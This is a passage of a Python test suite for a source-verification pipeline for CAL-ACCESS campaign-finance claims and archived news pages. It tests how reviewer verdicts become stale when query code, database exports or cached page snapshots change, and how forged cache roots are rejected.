    data, s = _query_run_with_verdict(tmp_path, monkeypatch)
    judgments.record(data, "q1", s.sid, "supports", "recorded before versions existed")
    claim = Claim(question_id="q1", question="?", answer="a", sources=[s])
    stale = judgments.apply_to(claim, data, cache_root=data)
    assert len(stale) == 1 and "before query definitions were versioned" in stale[0]

    # the page half never looks at a query citation, and the query half never at a page one:
    # an unstamped page verdict on a page cached before it was judged still applies
    page_src = src()
    cache_path(data, page_src.url).write_text(
        _page(fetched_at=datetime.now(UTC) - timedelta(hours=1)).model_dump_json())
    judgments.record(data, "q2", page_src.sid, "supports", "unstamped page verdict")
    assert judgments.apply_to(Claim(question_id="q2", question="?", answer="a",
                                    sources=[page_src]), data, cache_root=data) == []


def test_an_older_export_is_reported_but_the_verdict_stands(tmp_path):
    """When the figure moves with a new export, `expected` stops matching and the sid changes
    with it, so a verdict that survives a refresh is about the same number from the same
    calculation. Say the data moved; don't discard a judgment that still holds."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments

    root = _dated_export(tmp_path, when=(2026, 9, 1, 3, 0, 0))
    s = _ie_citation()
    (root / "claims").mkdir()
    (root / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    for args in (["verify"], ["judge", "q1", s.sid, "supports"]):
        res = CliRunner().invoke(cli.app, [*args, "--data", str(root)])
        assert res.exit_code == 0, res.output
    assert judgments.load(root, "q1")[s.sid].export_date == "2026-09-01"

    _dated_export(tmp_path, when=(2026, 9, 20, 3, 0, 0))
    code, out = _judgments_output(root)
    out = _plain(out)
    assert code == 0, out
    assert "1 query verdict(s) were formed against an older CAL-ACCESS export" in out
    assert ("judged against the CAL-ACCESS export of 2026-09-01; the database is now the "
            "CAL-ACCESS export of 2026-09-20") in out
    assert "0 of 1 cited source(s) need a verdict" in out


def _definition_fingerprint(name):
    """A hash of everything a query's result depends on in code: its own function, its required
    parameters, and every shared helper, dedup view and loader it runs through. Docstrings,
    comment lines and blank lines are dropped, so rewording one does not count as a change.

    Source text, not `ast.unparse`: CPython 3.12.3 (CI's) and 3.12.12 unparse an f-string's
    format spec differently, so an unparse-based pin passed locally and failed in CI. The AST
    is used only for where each docstring sits, which does not vary."""
    import ast
    import hashlib
    import inspect
    import textwrap

    from vgpipe import calaccess, queries

    def code(obj):
        if isinstance(obj, str):
            return " ".join(re.sub(r"--[^\n]*", "", obj).split())   # SQL, minus its comments
        if isinstance(obj, re.Pattern):
            return obj.pattern   # repr() truncates a long pattern
        if not callable(obj):
            return repr(obj)
        src = textwrap.dedent(inspect.getsource(obj))
        docstrings = set()
        for node in ast.walk(ast.parse(src)):
            body = getattr(node, "body", None)
            if (isinstance(node, (ast.FunctionDef, ast.ClassDef)) and body
                    and isinstance(body[0], ast.Expr) and isinstance(body[0].value, ast.Constant)
                    and isinstance(body[0].value.value, str)):
                docstrings.update(range(body[0].lineno - 1, body[0].end_lineno))
        return "\n".join(line.rstrip() for i, line in enumerate(src.splitlines())
                         if i not in docstrings and line.strip()
                         and not line.lstrip().startswith("#"))

    query = queries.REGISTRY[name]
    others = {id(q.fn) for q in queries.REGISTRY.values()} - {id(query.fn)}
    parts = [query.fn, query.required]
    # Everything else the two modules define counts, unless named in _NOT_A_DEFINITION. By
    # exclusion, not inclusion: a hand-kept list of what a query uses went stale within a day
    # (it missed the date-window helpers added later), and a new helper must trip the gate by
    # default rather than slip past it.
    for module in (queries, calaccess):
        for attr, obj in sorted(vars(module).items()):
            if attr in _NOT_A_DEFINITION[module.__name__] or id(obj) in others:
                continue
            defined_here = callable(obj) and getattr(obj, "__module__", None) == module.__name__
            constant = not callable(obj) and re.fullmatch(r"_?[A-Z][A-Z0-9_]*", attr)
            if defined_here or constant:
                parts.append(obj)
    return hashlib.sha1("\n\x00".join(code(p) for p in parts).encode()).hexdigest()[:12]


# What cannot change a value a query returns: display, messages, listings (finding aids, not
# citations), the export metadata, and the comparison and command a result is checked with.
_NOT_A_DEFINITION = {
    "vgpipe.queries": {"Query", "QueryResult", "REGISTRY", "dataset", "describe_export",
                       "export_date", "human_command", "matches"},
    "vgpipe.calaccess": {"COVER_FALLBACK", "Contribution", "DegradedDatabaseWarning",
                         "EXPORT_META", "EXPORT_URL", "_UNUSABLE", "_export_date",
                         "_read_export_info", "citable_snapshot", "committee_url",
                         "contributions_to", "db_path", "export_info", "filing_url",
                         "find_filers", "independent_expenditures", "shown_date", "unusable",
                         "zip_path"},
}


# name -> (version, fingerprint). See test_a_query_definition_cannot_change_unnoticed.
QUERY_DEFINITIONS = {
    "calaccess.contributor_total": (1, "c889da009c9c"),
    "calaccess.filer_total": (1, "bff2b989d16e"),
    "calaccess.top_contributor": (1, "21d238e9e26b"),
    "calaccess.ie_total": (2, "2f8f610a5a0f"),
}


def test_a_query_definition_cannot_change_unnoticed():
    """The version bump rule lives beside the registry, and a rule in a comment is one a session
    can skip — the definition changes, no version moves, and every verdict keeps vouching for a
    calculation nobody judged. So any change to a query's code, or to a helper or view it runs
    through, fails here until someone decides.

    To fix a failure: read the bump rule on `queries.Query.version`. If the change can alter
    what the query returns for ANY input the previous version accepted, bump its version in
    `queries.REGISTRY`. Either way, set its entry in QUERY_DEFINITIONS to what this test prints.
    A shared helper moves every fingerprint at once; decide for each query."""
    from vgpipe import queries

    got = {name: (q.version, _definition_fingerprint(name))
           for name, q in queries.REGISTRY.items()}
    moved = {n: {"pinned": QUERY_DEFINITIONS.get(n), "now": got.get(n)}
             for n in got.keys() | QUERY_DEFINITIONS.keys()
             if got.get(n) != QUERY_DEFINITIONS.get(n)}
    assert not moved, (
        f"query definitions changed: {moved}. Decide whether each needs a version bump (the "
        f"rule is on queries.Query.version), then pin QUERY_DEFINITIONS = {got!r}")


def test_the_fingerprint_sees_a_shared_helper_change(monkeypatch):
    """A change to a helper every query shares must move every fingerprint, or the gate above
    would pass a change that redefines all of them at once."""
    from vgpipe import queries

    before = {n: _definition_fingerprint(n) for n in queries.REGISTRY}
    monkeypatch.setattr(queries, "DEDUPED_RECEIPTS", queries.DEDUPED_RECEIPTS + " LIMIT 1")
    assert all(_definition_fingerprint(n) != before[n] for n in queries.REGISTRY)


def test_judge_refuses_a_query_verdict_the_last_run_did_not_produce(tmp_path, monkeypatch):
    """The verifier judged the context `vg verify` wrote. Stamping the registry's newer version
    over an older run's context would make a verdict about the old calculation read as current,
    and stamping today's export over an older export's context would hide that the data moved.
    So `vg judge` records a query verdict only when the claim's recorded run matches."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments, queries

    data, s = _query_run_with_verdict(tmp_path, monkeypatch)
    fn, required, desc, _ = queries.REGISTRY["test.total"]
    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(fn, required, desc, 2))

    res = CliRunner().invoke(cli.app, ["judge", "q1", s.sid, "supports", "--data", str(data)],
                             terminal_width=200)
    assert res.exit_code == 1
    out = _plain(res.output)
    assert "last verified under v1" in out and "is now v2" in out and "vg verify" in out
    assert judgments.load(data, "q1")[s.sid].query_version == 1, "nothing recorded"

    # the export moved under the claim: same refusal, naming both exports
    root = _dated_export(tmp_path / "shared", when=(2026, 9, 1, 3, 0, 0))
    (root / "claims").mkdir()
    ie = _ie_citation()
    (root / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[ie]).model_dump_json())
    assert CliRunner().invoke(cli.app, ["verify", "--data", str(root)]).exit_code == 0
    _dated_export(tmp_path / "shared", when=(2026, 9, 20, 3, 0, 0))
    res = CliRunner().invoke(cli.app, ["judge", "q1", ie.sid, "supports", "--data", str(root)],
                             terminal_width=200)
    assert res.exit_code == 1
    out = _plain(res.output)
    assert "CAL-ACCESS export of 2026-09-01" in out and "CAL-ACCESS export of 2026-09-20" in out
    assert judgments.load(root, "q1") == {}


def test_verify_lists_the_verdicts_its_own_re_fetch_made_stale(tmp_path, monkeypatch):
    """The stale list printed at the end of `vg verify` has to describe the cache as the run
    left it: a --refresh is exactly what makes a verdict stale, and a list computed before the
    fetches would say nothing to re-judge."""
    from typer.testing import CliRunner

    from vgpipe import cli, fetch as fetch_module

    data, cand, s = _candidate_run(tmp_path)
    res = CliRunner().invoke(cli.app, ["judge", "q1", s.sid, "supports", "--data", str(cand)])
    assert res.exit_code == 0, res.output

    def refetch(url, root, *, refresh=False, timeout=30.0):
        assert refresh
        _refetch_shared(root, s)
        return fetch_module.load_cached(root, url)

    monkeypatch.setattr("vgpipe.verify.fetch", refetch)
    res = CliRunner().invoke(cli.app, ["verify", "--data", str(cand), "--refresh"],
                             terminal_width=200)
    assert res.exit_code == 0, res.output
    out = _plain(res.output)
    assert "1 verdict(s) predate the page they judged" in out
    assert f"q1/{s.sid}:" in out and "re-fetched" in out


def test_a_red_query_row_prints_the_builds_own_root(tmp_path):
    """Build re-runs only the rows that count as evidence. On a failed query row the stamp came
    from the claim file, and its root became the --cache of the command the reviewer pastes: a
    hand-edited root pointing at a crafted database would "reproduce" the figure the red row
    says is wrong. Such a stamp is dropped and the command reads the build's own root."""
    import html
    import json
    import re
    import shlex

    from typer.testing import CliRunner

    from vgpipe import cli

    shared = _dated_export(tmp_path / "shared")
    data = tmp_path / "data"
    (data / "claims").mkdir(parents=True)
    forged = json.loads(Claim(question_id="q1", question="?", answer="a",
                              sources=[_ie_citation(expected="615000")]).model_dump_json())
    forged["sources"][0]["verification"] = {
        "status": "snippet_not_found", "reason": "query returned something else",
        "query_run": {"version": 1, "export_date": "2026-09-20",
                      "cache_root": str(tmp_path / "crafted")}}
    (data / "claims" / "q1.json").write_text(json.dumps(forged))

    res = CliRunner().invoke(cli.app, ["build", "--data", str(data), "--cache", str(shared)])
    assert res.exit_code == 0, res.output
    built = json.loads((data / "out" / "claims.json").read_text())[0]["sources"][0]
    assert built["verification"]["status"] == "snippet_not_found"
    assert built["verification"]["query_run"] is None
    page = html.unescape((data / "out" / "review.html").read_text())
    argv = shlex.split(re.search(r"uv run vg query [^<\n]*", page).group(0))
    assert argv[argv.index("--cache") + 1] == str(shared)
    assert str(tmp_path / "crafted") not in page


def test_export_info_reads_a_broken_database_as_unknown(tmp_path):
    """An interrupted build leaves a file that is not a database. Reading its export date only
    annotates, so it must not stop `vg judge` or `vg build`; the query itself fails loudly."""
    from vgpipe import calaccess

    calaccess.db_path(tmp_path).parent.mkdir(parents=True)
    calaccess.db_path(tmp_path).write_bytes(b"not a database, just half a download")
    assert calaccess.export_info(tmp_path) == {}


def test_an_interrupted_build_carries_no_export_date(tmp_path):
    """The export date certifies a finished build. Written first, it was committed with the
    first table, so a rebuild stopped partway answered queries from missing tables under a full
    export date — ie_total returned 612345.67 stamped 'the CAL-ACCESS export of 2026-09-20'.
    It is written last now, so a build that stops early reads as undated."""
    from vgpipe import calaccess

    root = _dated_export(tmp_path)
    assert calaccess.export_info(root)["export_date"] == "2026-09-20"

    def stop_after_first_table(table, n, note):
        raise KeyboardInterrupt

    with pytest.raises(KeyboardInterrupt):
        calaccess.build(root, progress=stop_after_first_table)
    assert calaccess.export_info(root) == {}, "a half-built database must not carry a date"


def test_a_stale_query_verdict_is_not_reported_as_standing(tmp_path):
    """The older-export note says a verdict stands. A verdict from before versioning is stale
    and not applied, so counting it there would tell the reviewer two contradictory things."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments

    root = _dated_export(tmp_path, when=(2026, 9, 1, 3, 0, 0))
    s = _ie_citation()
    (root / "claims").mkdir()
    (root / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    assert CliRunner().invoke(cli.app, ["verify", "--data", str(root)]).exit_code == 0
    judgments.record(root, "q1", s.sid, "supports", "recorded before versions existed")
    _dated_export(tmp_path, when=(2026, 9, 20, 3, 0, 0))

    code, out = _judgments_output(root)
    out = _plain(out)
    assert "1 verdict(s) predate the page they judged" in out
    assert "older CAL-ACCESS export" not in out
    res = CliRunner().invoke(cli.app, ["build", "--data", str(root)], terminal_width=200)
    assert res.exit_code == 0, res.output
    assert "older CAL-ACCESS export" not in _plain(res.output)


def test_the_fingerprint_covers_helpers_nobody_listed(monkeypatch):
    """The first gate hashed a hand-kept list of helpers and missed the date-window helpers
    added later, so a change to how `until` bounds a window would have passed unbumped.
    Everything a module defines now counts unless it is named as unable to change a result."""
    from vgpipe import calaccess, queries

    before = _definition_fingerprint("calaccess.ie_total")
    monkeypatch.setattr(queries, "date_window_sql", lambda iso_col, since, until: ("1", []))
    assert _definition_fingerprint("calaccess.ie_total") != before
    monkeypatch.undo()
    monkeypatch.setattr(calaccess, "check_date", lambda value, name: value)
    assert _definition_fingerprint("calaccess.ie_total") != before
    monkeypatch.undo()

    # ...and what cannot change a value stays out, or every wording fix would trip it
    monkeypatch.setattr(queries, "human_command", lambda *a, **k: "")
    assert _definition_fingerprint("calaccess.ie_total") == before


def test_judge_checks_the_run_of_the_question_it_records_for(tmp_path, monkeypatch):
    """Two questions citing one query share its sid, and each carries its own last run. The
    check read whichever claim the loop reached, so re-verifying one question could still be
    refused because the other hadn't been — or the reverse could record a stale verdict."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments, queries

    data, s = _query_run_with_verdict(tmp_path, monkeypatch)
    (data / "claims" / "q2.json").write_text(
        Claim(question_id="q2", question="?", answer="a", sources=[s]).model_dump_json())
    assert CliRunner().invoke(cli.app, ["verify", "--data", str(data)]).exit_code == 0
    fn, required, desc, _ = queries.REGISTRY["test.total"]
    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(fn, required, desc, 2))
    assert CliRunner().invoke(cli.app, ["verify", "--data", str(data), "--qid", "q2"]
                              ).exit_code == 0          # q2 at v2; q1 still says v1

    ok = CliRunner().invoke(cli.app, ["judge", "q2", s.sid, "supports", "--data", str(data)])
    assert ok.exit_code == 0, ok.output
    assert judgments.load(data, "q2")[s.sid].query_version == 2
    stale = CliRunner().invoke(cli.app, ["judge", "q1", s.sid, "supports", "--data", str(data)])
    assert stale.exit_code == 1 and "last verified under v1" in _plain(stale.output)


def test_judge_refuses_a_run_read_from_another_database(tmp_path, monkeypatch):
    """Undated databases, or two built from one export, compare equal on version and date. The
    root is what tells them apart: a verdict stamped from B is not about the context A gave."""
    from typer.testing import CliRunner

    from vgpipe import cli, judgments

    data, s = _query_run_with_verdict(tmp_path, monkeypatch)   # verified under root `data`
    other = tmp_path / "other"
    (other / "cache").mkdir(parents=True)   # a real cache root, just not the one verified
    res = CliRunner().invoke(cli.app, ["judge", "q1", s.sid, "contradicts", "--data", str(data),
                                       "--cache", str(other)], terminal_width=200)
    assert res.exit_code == 1
    assert "same --cache" in _plain(res.output)
    assert judgments.load(data, "q1")[s.sid].verdict == "supports", "nothing recorded"


def test_an_unprintable_cache_root_fails_the_row_not_the_run(tmp_path, monkeypatch):
    """The stamp refuses a root no pasted command could name. That refusal used to escape as a
    ValidationError partway through `vg verify`, losing every claim the run had already done."""
    from vgpipe import queries
    from vgpipe.models import QueryCitation

    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(
        lambda root, **kw: queries.QueryResult(value=12345.0), ("filer_id",), "test", 1))
    s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"}, expected="12345"))
    v = verify_source(s, tmp_path / "data​").verification
    assert v.status == "fetch_failed" and "invisible character" in v.reason

    claimed = src(query=QueryCitation(name="test.total", params={"filer_id": "1"},
                                      expected="12345"))
    claimed.verification.status = "verified"
    assert revalidate_from_cache(claimed, tmp_path / "data​").verification.status == \
        "human_review"


def test_a_query_row_judge_would_refuse_is_blocked_not_waiting(tmp_path, monkeypatch):
    """`vg judgments` counted a query row as needing a verdict when its claim file predates the
    current definition or export — the rows `vg judge` refuses. The gate could not reach 0 by
    judging; re-verifying is what closes it, so the row is listed with the blocked ones."""
    import json

    from typer.testing import CliRunner

    from vgpipe import cli, queries
    from vgpipe.models import QueryCitation

    monkeypatch.setitem(queries.REGISTRY, "test.total", queries.Query(
        lambda root, **kw: queries.QueryResult(value=12345.0), ("filer_id",), "test", 1))
    s = src(query=QueryCitation(name="test.total", params={"filer_id": "1"}, expected="12345"))
    data = tmp_path / "data"
    (data / "claims").mkdir(parents=True)
    (data / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    assert CliRunner().invoke(cli.app, ["verify", "--data", str(data)]).exit_code == 0
    assert _unjudged(data) == (1, 1, 0, 0)

    # a claim file verified before runs were stamped
    raw = json.loads((data / "claims" / "q1.json").read_text())
    raw["sources"][0]["verification"]["query_run"] = None
    (data / "claims" / "q1.json").write_text(json.dumps(raw))
    assert _unjudged(data) == (0, 1, 0, 1)


def test_a_page_verdict_is_written_in_the_format_older_code_reads(tmp_path, monkeypatch):
    """load() refuses unknown keys, so writing the new query fields into every entry made an
    older checkout sharing data/ stop on every shard this code rewrote — page verdicts
    included, which never use them. They are written only when set."""
    import json

    from vgpipe import judgments

    judgments.record(tmp_path, "q1", src().sid, "supports", "a page verdict",
                     page_fetched_at="2026-09-01T00:00:00+00:00", extractor_version=3)
    entry = json.loads(judgments.path_for(tmp_path, "q1").read_text())[0]
    assert set(entry) <= {"sid", "verdict", "note", "judged_at", "judge", "page_fetched_at",
                          "extractor_version"}, "only the keys a pre-versioning loader knows"

    data, s = _query_run_with_verdict(tmp_path / "run", monkeypatch)
    entry = json.loads(judgments.path_for(data, "q1").read_text())[0]
    assert entry["query_version"] == 1, "a query verdict still carries what it was judged under"
    assert judgments.load(data, "q1")[s.sid].query_version == 1
# --- a verdict is stamped from the copy of the page the verifier read ---------------------


SNAP_A = f"https://web.archive.org/web/20260901000000/{PAYWALLED}"
SNAP_B = f"https://web.archive.org/web/20260920000000/{PAYWALLED}"


def _cache(root, url, fetched_at, **kw):
    """Cache `url` under the current extractor, so `vg verify` serves it without the network."""
    from vgpipe.fetch import cache_path
    from vgpipe.models import EXTRACTOR_VERSION

    page = _page(url=url, fetched_at=fetched_at, extractor_version=EXTRACTOR_VERSION, **kw)
    cache_path(root, url).write_text(page.model_dump_json())
    return page


def _verification(data):
    from vgpipe.cli import load_claims

    return load_claims(data / "claims", trust_machine_fields=True)[0].sources[0].verification


def _archive_verified_run(tmp_path):
    """A run whose one source is paywalled live and verified against snapshot A, as `vg verify`
    leaves it: the stub and the snapshot both cached, the snapshot in the run's records."""
    from datetime import timedelta

    from vgpipe import archive as arch

    data, now = tmp_path / "data", datetime.now(UTC)
    _cache(data, PAYWALLED, now - timedelta(days=3), status=403, text="", paywall_suspected=True)
    _cache(data, SNAP_A, now - timedelta(days=2))
    arch.save_records(data, {PAYWALLED: {"snapshot": SNAP_A, "error": None}})
    s = src(url=PAYWALLED, publisher="OC Register")
    (data / "claims").mkdir(parents=True)
    (data / "claims" / "q1.json").write_text(
        Claim(question_id="q1", question="?", answer="a", sources=[s]).model_dump_json())
    code, out = _vg("verify", "--data", data)
    assert code == 0, out
    return data, s


def test_verify_names_the_copy_each_context_came_from(stub, tmp_path):
    """`vg judge` stamps the copy the context was built from, so verify has to say which one
    that was; revalidation re-derives it from the page it checked, whatever the file said."""
    from vgpipe.models import PageCopy

    page = _page()
    stub[page.url] = page
    v = verify_source(src(), tmp_path, rules=RULES).verification
    assert v.context_page == PageCopy(url=page.url, fetched_at=page.fetched_at,
                                      extractor_version=page.extractor_version)
    assert verify_source(src(snippet="a quote that is nowhere here"), tmp_path,
                         rules=RULES).verification.context_page is None, "no context, no copy"

    elsewhere = PageCopy(url="https://elsewhere.example/", fetched_at=page.fetched_at,
                         extractor_version=99)
    forged = _stamped(src(), page)
    forged.verification.context_page = elsewhere
    assert revalidate_from_cache(forged, tmp_path,
                                 rules=RULES).verification.context_page == v.context_page
    gone = _stamped(src(), page)
    gone.url = "https://calmatters.org/gone"            # nothing cached: discarded
    gone.verification.context_page = elsewhere
    out = revalidate_from_cache(gone, tmp_path, rules=RULES).verification
    assert out.status == "human_review" and out.context_page is None


def test_judge_stamps_an_archive_verified_source_from_its_snapshot(tmp_path):
    """The verifier read context from the Wayback snapshot, but `vg judge` stamped the
    paywall stub at the cited URL. The stub never changes, so the stamp described nothing the
    verifier read, and no re-archive could ever make the verdict stale."""
    from vgpipe import judgments
    from vgpipe.fetch import load_cached

    data, s = _archive_verified_run(tmp_path)
    v = _verification(data)
    assert v.status == "verified_via_archive"
    assert v.context_page.url == SNAP_A, "verify names the copy the context came from"

    code, out = _vg("judge", "q1", s.sid, "supports", "--data", data)
    assert code == 0, out
    j = judgments.load(data, "q1")[s.sid]
    snap, stub_page = load_cached(data, SNAP_A), load_cached(data, PAYWALLED)
    assert (j.page_url, j.page_fetched_at) == (SNAP_A, str(snap.fetched_at))
    assert j.page_fetched_at != str(stub_page.fetched_at)
    # written, so an older checkout refuses the shard rather than check it against the stub
    assert f'"page_url": "{SNAP_A}"' in judgments.path_for(data, "q1").read_text()
    # `vg judgments` used to discard every archive row as "no snapshot recorded": it never
    # applied the run's records, so the row read as blocked whatever was judged
    assert _unjudged(data) == (0, 1, 0, 0)
    assert _built_unreviewed(data) == {}


def test_a_re_archive_makes_an_archive_verified_verdict_stale(tmp_path, monkeypatch, capsys):
    """`vg archive` saves a fresh snapshot every run, so a verdict about snapshot A's text
    was applied to snapshot B's with no staleness signal: the check compared the stub, which
    never changes. Stale in apply_to(), in `vg judgments`, and not applied by `vg build`."""
    from vgpipe import cli, judgments

    data, s = _archive_verified_run(tmp_path)
    assert _vg("judge", "q1", s.sid, "supports", "--data", data)[0] == 0

    _cache(data, SNAP_B, datetime.now(UTC))           # the same article, captured again

    def fresh_save(urls, *, delay=3.0, progress=None):
        for u in urls:
            progress(u, SNAP_B, None)

    monkeypatch.setattr(cli.arch, "archive_all", fresh_save)
    capsys.readouterr()
    cli.archive(data=data, delay=0)
    v = _verification(data)
    assert (v.status, v.context_page.url) == ("verified_via_archive", SNAP_B)
    # `vg archive` runs after the judgment pass, so it has to say the pass is due again
    said = " ".join(re.sub(r"\x1b\[[0-9;]*m", "", capsys.readouterr().out).split())
    assert "1 verdict(s) on archive-verified sources were about a snapshot this run replaced" in said, said

    claim = cli.load_claims(data / "claims", trust_machine_fields=True)[0]
    cli._apply_archives([claim], cli._archive_records(data), data)
    [why] = judgments.apply_to(claim, data, cache_root=data)
    assert (f"judged against the snapshot {SNAP_A}; its context now comes from the snapshot "
            f"{SNAP_B}") in why, why
    assert claim.sources[0].verification.support == "unreviewed"

    assert _unjudged(data) == (1, 1, 1, 0)
    assert _built_unreviewed(data) == {PAYWALLED: "verified_via_archive"}, "not applied by build"

    # judging the context the new snapshot gave is what closes it
    assert _vg("judge", "q1", s.sid, "supports", "--data", data)[0] == 0
    assert _unjudged(data) == (0, 1, 0, 0)


def test_judge_refuses_when_the_page_was_re_fetched_after_verify(tmp_path):
    """The page cache is shared, so another run can re-fetch a page between `vg verify`
    and `vg judge`. The verdict was stamped from the new copy, read fresh against it, and after
    the next verify `vg build` rendered `verified, supports` on text the verifier never saw."""
    data, cand, s = _candidate_run(tmp_path)
    judged = _verification(cand).context
    _cache(data, s.url, datetime.now(UTC), text=PAGE_TEXT.replace(
        "Levy Act,", "Levy Act [REFETCHED: this clause was repealed],"))

    code, out = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 1 and "the cache now holds one fetched" in out and "vg verify" in out, out
    assert _shard_files(cand) == {}, "refused, writing nothing"

    # the reproduction's last step: verify, then build. Nothing renders green on text no
    # verifier read.
    assert _vg("verify", "--data", cand)[0] == 0
    assert "REFETCHED" in _verification(cand).context and "REFETCHED" not in judged
    assert _built_unreviewed(cand) == {s.url: "verified"}

    # the context verify gives now is what can be judged
    code, out = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 0, out
    assert _built_unreviewed(cand) == {}
    # The cited page goes unnamed on disk, as on every verdict from before `page_url`, so an
    # older checkout sharing this data/ still reads (and correctly checks) the shard.
    import json

    from vgpipe import judgments

    [raw] = json.loads(judgments.path_for(cand, "q1").read_text())
    assert "page_url" not in raw and raw["page_fetched_at"], raw


def test_judge_refuses_a_snapshot_context_it_cannot_tie_to_the_run(tmp_path):
    """The same rule for the snapshot. `vg judge` refuses, writing nothing, when the snapshot
    the context came from is no longer the one the run's records name (a `vg archive` stopped
    between saving its records and rewriting the claims), was re-fetched since verify, or has
    left the cache (no page to compare against is no stamp)."""
    from vgpipe import archive as arch
    from vgpipe.fetch import cache_path

    data, s = _archive_verified_run(tmp_path)

    def judge():
        return _vg("judge", "q1", s.sid, "supports", "--data", data)

    _cache(data, SNAP_B, datetime.now(UTC))
    arch.save_records(data, {PAYWALLED: {"snapshot": SNAP_B, "error": None}})
    code, out = judge()
    assert code == 1 and f"its context now comes from the snapshot {SNAP_B}" in out, out
    arch.save_records(data, {PAYWALLED: {"snapshot": SNAP_A, "error": None}})

    _cache(data, SNAP_A, datetime.now(UTC))
    code, out = judge()
    assert code == 1 and "the cache now holds one fetched" in out, out

    cache_path(data, SNAP_A).unlink()
    code, out = judge()
    assert code == 1 and f"{SNAP_A} is not in the page cache" in out, out
    assert _shard_files(data) == {}


def test_judge_refuses_a_source_verify_gave_no_copy(tmp_path):
    """A paywalled source has no context to judge, and one verified before verify recorded its
    page names no copy: a stamp either way would be a guess. And a copy the claim file names
    that is not where the context comes from can only refuse — here, a hand edit pointing an
    archive row back at its stub."""
    from vgpipe.fetch import load_cached

    data, cand, s = _candidate_run(tmp_path)
    _edit_claim(cand, "q1", 0, context_page=None)
    code, out = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 1 and "has recorded no page" in out and "it is verified" in out, out
    _edit_claim(cand, "q1", 0, status="could_not_verify_paywall")
    code, out = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 1 and "it is could_not_verify_paywall" in out, out
    assert _shard_files(cand) == {}

    data, s = _archive_verified_run(tmp_path / "archive")
    stub_page = load_cached(data, PAYWALLED)
    _edit_claim(data, "q1", 0, context_page={"url": PAYWALLED,
                                             "fetched_at": stub_page.fetched_at.isoformat(),
                                             "extractor_version": stub_page.extractor_version})
    code, out = _vg("judge", "q1", s.sid, "supports", "--data", data)
    assert code == 1 and "judged against the cited page" in out, out
    assert _shard_files(data) == {}


def test_a_verdict_is_stale_once_the_context_comes_from_another_page(tmp_path):
    """The page compared is the one the verdict judged, and it must be where the context comes
    from now. A verdict recorded before `page_url` existed was stamped from the cited page — for
    an archive row, the stub — so there it reads stale; so does one on an archive row with no
    snapshot recorded; and one judged against a snapshot is stale once the paywall comes down
    and the context comes from the live page."""
    from vgpipe import cli, judgments

    data, s = _archive_verified_run(tmp_path)
    claim = cli.load_claims(data / "claims", trust_machine_fields=True)[0]
    cli._apply_archives([claim], cli._archive_records(data), data)

    stub_at, ver = _stamp(data, PAYWALLED)
    judgments.record(data, "q1", s.sid, "supports", page_fetched_at=stub_at,
                     extractor_version=ver)                                  # no page_url
    [why] = judgments.apply_to(claim, data, cache_root=data)
    assert (f"judged against the cited page; its context now comes from the snapshot "
            f"{SNAP_A}") in why, why

    snap_at, ver = _stamp(data, SNAP_A)
    judgments.record(data, "q1", s.sid, "supports", page_fetched_at=snap_at,
                     extractor_version=ver, page_url=SNAP_A)
    assert judgments.apply_to(claim, data, cache_root=data) == []

    claim.sources[0].archive_url = None                 # a command that skipped the records
    [why] = judgments.apply_to(claim, data, cache_root=data)
    assert "the run's records name no usable one" in why, why

    claim.sources[0].verification.status = "verified"   # the paywall came down
    [why] = judgments.apply_to(claim, data, cache_root=data)
    assert (f"judged against the snapshot {SNAP_A}; its context now comes from the cited "
            f"page") in why, why

    # A verdict from before `page_url`, on a row that has since fallen back to its paywall (a
    # new snapshot stopped confirming the snippet). Stamped from the stub, which never changes,
    # so the times agree — but it may be about the snapshot the row has lost.
    claim.sources[0].verification.status = "could_not_verify_paywall"
    judgments.record(data, "q1", s.sid, "topic_only", page_fetched_at=stub_at,
                     extractor_version=ver)
    [why] = judgments.apply_to(claim, data, cache_root=data)
    assert "judged against the cited page, which is now paywalled" in why, why
    assert claim.sources[0].verification.support == "unreviewed"


def test_judge_on_a_live_row_does_not_need_the_archive_records(tmp_path):
    """Only an archive row's context depends on the run's records, so a damaged records file
    must not stop verdicts on every other row of the run."""
    _, cand, s = _candidate_run(tmp_path)
    (cand / "archives.json").write_text("{not json")
    code, out = _vg("judge", "q1", s.sid, "supports", "--data", cand)
    assert code == 0, out
    assert _unjudged(cand) == (0, 1, 0, 0), "nor the gate, on a run with no archive row"


def test_judgments_does_not_wait_on_a_verdict_judge_would_refuse(tmp_path, monkeypatch):
    """The gate counts only what the judgment pass can close. A source verified before verify
    recorded its page is refused by `vg judge`, and so is one whose page was re-fetched since:
    counted as waiting, the gate stays above 0 however many verifiers run."""
    from vgpipe import cli

    data, cand, s = _candidate_run(tmp_path)
    monkeypatch.setattr(cli.con, "_width", 200)     # read a table cell, so don't let it wrap
    assert _unjudged(cand) == (1, 1, 0, 0)
    _edit_claim(cand, "q1", 0, context_page=None)
    assert _unjudged(cand) == (0, 1, 0, 1)
    assert _vg("judge", "q1", s.sid, "supports", "--data", cand)[0] == 1, "judge agrees"

    assert _vg("verify", "--data", cand)[0] == 0
    assert _unjudged(cand) == (1, 1, 0, 0)
    _refetch_shared(data, s)                         # after verify: its copy is gone
    code, out = _judgments_output(cand)
    assert "unreviewed (run vg verify)" in out, out
    assert _unjudged(cand) == (0, 1, 0, 1)
